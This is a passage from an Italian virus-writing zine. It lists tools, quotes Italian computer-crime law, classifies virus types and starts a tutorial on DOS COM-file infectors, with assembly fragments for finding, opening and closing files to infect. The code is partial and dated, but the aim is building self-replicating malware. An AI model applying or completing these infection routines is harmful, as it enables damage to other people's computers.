assemblatore (si consiglia il pacchetto TASM 5.0 che include TASM32 e TLINK32);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>SoftICE
3.23+<span style="mso-spacerun: yes">  </span>per Win9X;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>La
lista delle funzioni API (Win32.HLP);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
documento di Matt Pietrek sull’header del file PE;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
tool PEWRSEC;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>qualche
zine, ad esempio 29A(#2,#3),Xine(#2,#3,#4),VLAD(#6),DDT(#1);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>qualche
virus per Windows;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>un
paio di AV per Win32.<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'>ed
ora, al lavoro !<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoHeading8><b><span style='color:silver'><span style="mso-spacerun:
yes"> </span></span></b><b><span lang=DE style='color:silver;mso-ansi-language:
DE'>§ MATER</span></b><span lang=DE style='color:silver;mso-ansi-language:DE'>
liber primus <b>§</b><o:p></o:p></span></p>

<p class=MsoNormal><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='color:#FFCC00'>indice</span><span
style='color:#FF99CC'><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='color:#FFCC00'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo3;
tab-stops:list 36.0pt'><![if !supportLists]><span style='font-family:Arial;
mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-family:Arial;mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>leggi</span><span style='color:#CCFFCC'> </span><span
style='font-family:Arial;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo3;
tab-stops:list 36.0pt'><![if !supportLists]><span style='font-family:Arial;
mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-family:Arial;mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'><a href="#_2._COSA_SONO"><span style='color:#CCFFCC'>definizioni</span></a><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo3;
tab-stops:list 36.0pt'><![if !supportLists]><span style='font-family:Arial;
mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-family:Arial;mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'><a href="#_3._I_VIRUS"><span style='color:#CCFFCC'>COM
infettori</span></a><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo3;
tab-stops:list 36.0pt'><![if !supportLists]><span style='font-family:Arial;
mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-family:Arial;mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'><a href="#_5._I_VIRUS"><span style='color:#CCFFCC'>file
COM: problematiche</span></a><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:18.0pt'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoNormal style='margin-left:18.0pt'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC00'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoNormal style='margin-left:18.0pt'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC00'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FF6600'>1. LEGGI<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FF6600'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>Prima di tutto è
necessario conoscere le leggi che riguardano la materia che studieremo (nota:
tali leggi valgono solo per l’Italia).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>Art.
615-quinquies - (Diffusione di programmi diretti a danneggiare o interrompere
un sistema informatico). - Chiunque diffonde, comunica o consegna un programma
informatico da lui stesso o da altri redatto, avente per scopo o per effetto il
danneggiamento di un sistema informatico o telematico, dei dati o dei programmi
in esso contenuti o ad essi pertinenti, ovvero l'interruzione, totale o
parziale, o l'alterazione del suo funzionamento, e' punito con la reclusione
sino a due anni e con la multa sino a lire venti milioni&quot;.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>Carlo Sarzana di
S. Ippolito, presidente aggiunto della sezione Gip del Tribunale di Roma, nella
sua relazione presentata al convegno sulla criminalita' informatica tenutosi a
Milano il 26 maggio 1994 rispetto alla legge Conso (l. n. 547/93 pubblicata in
Gazzetta Ufficiale n. 305 30.12.93) sui reati informatici osservava che:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>1) con riguardo
all'art. 615 ter., che punisce l'accesso abusivo a un sistema informatico o
telematico, la tutela e' limitata ai sistemi<span style="mso-spacerun: yes"> 
</span>informatici o telematici protetti da misure di sicurezza perche',
dovendosi tutelare il diritto di un soggetto specifico, e' necessario che
quest'ultimo abbia dimostrato, con la predisposizione di mezzi di<span
style="mso-spacerun: yes">  </span>protezione sia logica che fisica, di voler
espressamente riservare l'accesso e la permanenza nel sistema alle sole persone
da lui<span style="mso-spacerun: yes">  </span>autorizzate;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>2) in riferimento
all'art. 615 quater che punisce l'abusiva acquisizione e diffusione di codici
di accesso a sistemi informatici o telematici,<span style="mso-spacerun: yes"> 
</span>viene definito che, per la configurabilita' del delitto, e' richiesto il
dolo specifico, consistente nel fine di procurare un profitto a se' o ad<span
style="mso-spacerun: yes">  </span>altri o di arrecare ad altri un danno;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>3) a proposito
dei virus (articolo 615-quinques) non commette reato colui che per ragioni di
studio o predisposizione di sistemi di prevenzione,<span style="mso-spacerun:
yes">  </span>raccolga e/o custodisce programmi virus.<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:18.0pt'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC00'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoNormal style='margin-left:18.0pt'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC00'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_2._COSA_SONO"></a><a name=PROBLEMATICHE></a><span
style='font-size:14.0pt;mso-bidi-font-size:24.0pt;color:#FF6600'>2. COSA SONO I
VIRUS<o:p></o:p></span></h1>

<h1 style='text-align:justify'><span style='font-size:12.0pt;mso-bidi-font-size:
24.0pt;color:#FFCC99;font-weight:normal'>Nella scena virale sono presenti
decine di specie diverse, e per uno studio che non sia troppo generalizzato è
necessario fare delle scelte.<span style="mso-spacerun: yes">  </span>MATER si
interessa principalmente di virus parassitari, anche se sono in previsione
numeri monografici sui Troiani e sui Virus Companion. Quella che segue è una
classificazione assai incompleta, ma necessaria per avere presente l’oggetto
del nostro studio. Per una ricerca più approfondita sull’argomento si consiglia
di visitare i siti delle maggiori case AV (antivirus), o di scaricare l’ottima
AVP Virus Encyclopedia (AVPVE)
http://www.avp.ch/avpve/http://www.virusdatabase.com/.<o:p></o:p></span></h1>

<h1><span style='font-size:12.0pt;mso-bidi-font-size:24.0pt;color:#FFCC99'>1.
Definizione<o:p></o:p></span></h1>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>Il
Virus è un programma auto-replicante che può infettare altri programmi
modificandoli ed includendo copia di se stesso.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>Il
programma-virus non può agire da solo, ma deve veicolarsi a un ospite, che
diventa un programma infetto od “host”. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><b><span style='color:#FFCC99'>2.
Alcuni tipi di virus<o:p></o:p></span></b></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>I
virus si suddividono in genere in base al punto in cui colpiscono il sistema:
Boot, Tavole d'allocazione dei file, Exe e Com, in pochi casi i Bat e di
recente Macro virus. Altri si differenziano in modo netto e vengono pertanto
chiamati virus solo in senso generico (troiani, dropper, worm ...). <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText><span style='color:#FFCC99'>Gli infettori di files
attaccano se stessi a programmi ordinari ed infettano Exe e/o Com (ve ne sono
che possono infettare ogni programma che richieda un'esecuzione o
un'interpretazione [Sys, Ovl, Obj, Prg, Drv, e Bat]) appendendo il codice
virale al termine del file oppure nascondendolo all'interno. In base alla loro
posizione rispetto alla memoria, suddividiamo:<o:p></o:p></span></p>

<h4 style='text-align:justify'><span style='font-family:"Times New Roman";
color:#FFCC99;font-weight:normal'>a) Virus &quot;ad azione diretta&quot; (o
&quot;non residenti&quot;): Selezionano uno o più programmi e li infettano prima
di rilasciare il controllo ogni volta che è eseguito un file infettato da loro.
<o:p></o:p></span></h4>

<h4 style='text-align:justify'><span style='font-family:"Times New Roman";
color:#FFCC99;font-weight:normal'>b) Virus &quot;residenti&quot; in memoria
(TSR virus): la maggior parte operano installandosi in memoria RAM; poi
infettano tutti i file eseguiti, oppure aspettano che siano soddisfatte
determinate condizioni. <o:p></o:p></span></h4>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>In
questa sede approfondiremo i “Virus parassitari” (Parasitic Viruses), che sono
tutti i virus che cambiano il contenuto del file che vanno ad infettare
trasferendo una copia del loro codice non alterando il funzionamento del file
ospitante (che essendo un file eseguibile, può essere eseguito). <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>Esistono
tre modi di inserire del codice virale all’interno di un file:<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l5 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='color:#FFCC99'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='color:#FFCC99'>codice virale all’inizio
del file ospitante (prepending);<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l5 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='color:#FFCC99'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='color:#FFCC99'>codice virale alla fine del
file ospitante (appending);<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l5 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='color:#FFCC99'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='color:#FFCC99'>codice virale all’interno
del file ospitante (inserting).<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>In
particolare ci interesseremo dei virus “appending” ad azione diretta - la
materia è alquanto vasta e si rendono necessarie delle scelte. Questo metodo,
che risulta assai comune, consiste nel modificare l’inizio del file ospitante
in maniera tale che quando il file ospitante (d’ora in poi, per amore di
brevità, chiameremo host) è caricato in meMoria, il virus viene ad essere
eseguito per primo (si suol dire che “prende il controllo”) e quindi, dopo aver
eseguito le sue routines, rilascia il controllo all’host che viene eseguito
normalmente.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#FFCC99'>Tale
processo avviene in maniera diversa a seconda del file da infettare e del
sistema operativo; la suddivisione principale riguarda quindi file eseguibili
sotto DOS (COM infettori ed EXE infettori) e file eseguibili sotto Windows a 32
bit (Win32 infettori).<b><o:p></o:p></b></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
18.0pt;mso-bidi-font-size:10.0pt;font-family:Albertus;mso-fareast-font-family:
"MS Mincho";color:#FF6600'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_3._I_VIRUS"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red'>3. I VIRUS COM INFETTORI<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>1. generalità <o:p></o:p></span></b></p>

<p class=MsoNormal><span style='color:#CCFFFF'><span style="mso-spacerun:
yes"> </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'>I Com
sono &quot;memory image files&quot; e una volta eseguiti si pongono in memoria
senza alcuna interpretazione a partire dall'offset 100h; possono inoltre avere
una dimensione massima di 64 K. <o:p></o:p></span></p>

<p style='margin:0cm;margin-bottom:.0001pt;text-align:justify'><span
style='font-family:"Times New Roman";color:#CCFFFF'>In genere il virus
sovrascrive l'inizio dell’host con una piccola parte del codice virale
(un’istruzione di salto), salvando i primi byte del programma in fondo ed
agganciando poi il resto del codice virale al termine dell’host. Una volta che
il file infettato è caricato in memoria, l’istruzione scritta all' inizio
dell’host effettua un salto (JUMP) al resto del codice virale che, dopo aver
eseguito le sue routines, riscrive i byte iniziali dell’host nella giusta
posizione ed esegue poi un Jump verso di loro andando ad eseguire l’host. <o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><span style='font-size:12.0pt;mso-bidi-font-size:24.0pt;color:#CCFFFF'>2.
Gli elementi di un Virus COM infettore<o:p></o:p></span></h1>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'>Ogni virus è composto
principalmente di due parti: <o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l3 level1 lfo9;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>una routine di ricerca che localizzi nuovi files da
infettare o aree su disco che si intendono infettare (virus di boot). <o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l3 level1 lfo9;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>2.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>una routine di replicazione del codice del virus stesso.<o:p></o:p></span></p>

<p class=MsoFooter style='tab-stops:35.4pt center 240.95pt right 481.9pt'><span
style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText><span style='color:#CCFFFF'>Oltre a queste due componenti
in genere se ne aggiungono altre, come<span style="mso-spacerun: yes"> 
</span>routines che cercano di impedire ai software antivirus di rivelare la
presenza del virus. <o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><b><span style='color:#CCFFFF'>3. La routine di ricerca<o:p></o:p></span></b></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'>Il procedimento infettivo segue
i seguenti punti:<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l7 level1 lfo12;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'><span style="mso-spacerun: yes"> </span>Trovare un file
da infettare;<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l7 level1 lfo12;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>2.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>controllare se è già stato infettato;<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l7 level1 lfo12;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>3.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>se già infettato, torna al punto 1;<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l7 level1 lfo12;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>4.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>se non è infettato, infettalo.<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'>1. Trovare un file da infettare<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'>Il
metodo di ricerca più semplice e maggiormente utilizzato è quello di cercare
nella directory corrente. Le funzioni usate sono la 4EH, la 3DH, la 3EH e la
4FH dell’interrupt 21H.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'>La funzione
4EH cerca il primo file nella directory corrente con il nome da noi
specificato:<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cerca:<span style="mso-spacerun: yes">     </span>mov
ah,04eh<span style="mso-spacerun: yes">          </span>; cerca il primo file
nella dir. corrente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>xor cx,cx<span
style="mso-spacerun: yes">            </span>; maschera attributi del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>lea
dx,com_mask<span style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">   </span>; in ds:dx viene inserito l'offset del nome<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<span
style="mso-spacerun: yes">              </span>; del file da aprire<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>...<span
style="mso-spacerun: yes">                    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>...<span
style="mso-spacerun: yes">                    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='margin-left:35.4pt;text-indent:6.6pt'><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">    </span>com_mask:<span style="mso-spacerun: yes"> 
</span>db &quot;*.c*&quot;,0<span style="mso-spacerun: yes">    </span>;
maschera di ricerca per l'estensione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>La
funzione 3DH apre il file:<span style="mso-spacerun: yes">            </span><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>apri:<span style="mso-spacerun: yes">      </span>mov
ax,3d02h<span style="mso-spacerun: yes">         </span>; apro il file in
lettura/scrittura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>mov
dx,9eh<span style="mso-spacerun: yes">           </span>; ricavo il nome del
file dalla DTA <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<span
style="mso-spacerun: yes">              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Qui
va inserita la chiamata alla routine di replicazione:<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>La
funzione<span style="mso-spacerun: yes">  </span>3EH chiude il file dopo averlo
infettato:<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>prossimo:<span style="mso-spacerun: yes">  </span>mov
ah,3eh<span style="mso-spacerun: yes">           </span>; chiudo il file<o:p></o:p></span></b></p>

